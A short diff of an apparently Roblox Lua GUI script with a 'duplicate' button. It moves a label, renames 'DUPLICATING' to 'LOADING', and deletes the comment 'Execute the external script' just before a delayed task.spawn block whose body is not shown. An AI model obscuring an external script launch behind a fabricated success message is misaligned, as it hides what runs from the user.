@@ -185,7 +185,7 @@ duplicateBtn.TextTransparency = 0.5
 -- Credit Text
 local creditLabel = Instance.new("TextLabel", page)
 creditLabel.Size = UDim2.new(1, -20, 0, 16)
-creditLabel.Position = UDim2.new(0, 10, 0, 95)
+creditLabel.Position = UDim2.new(0, 10, 0, 90)
 creditLabel.Text = "@sophiasy2008"
 creditLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
 creditLabel.Font = Enum.Font.FredokaOne
@@ -299,7 +299,7 @@ duplicateBtn.MouseButton1Click:Connect(function()
         local loadingTitle = Instance.new("TextLabel", loadingHeader)
         loadingTitle.Size = UDim2.new(1, 0, 1, 0)
         loadingTitle.Position = UDim2.new(0, 0, 0, 0)
-        loadingTitle.Text = "DUPLICATING"
+        loadingTitle.Text = "LOADING"
         loadingTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
         loadingTitle.Font = Enum.Font.FredokaOne
         loadingTitle.TextSize = 16
@@ -411,7 +411,6 @@ duplicateBtn.MouseButton1Click:Connect(function()
         successMsgLabel.Text = "Successfully duplicated: " .. base .. "!"
         successMsgLabel.Visible = true
         
-        -- Execute the external script
         
         task.spawn(function()
             task.wait(2)
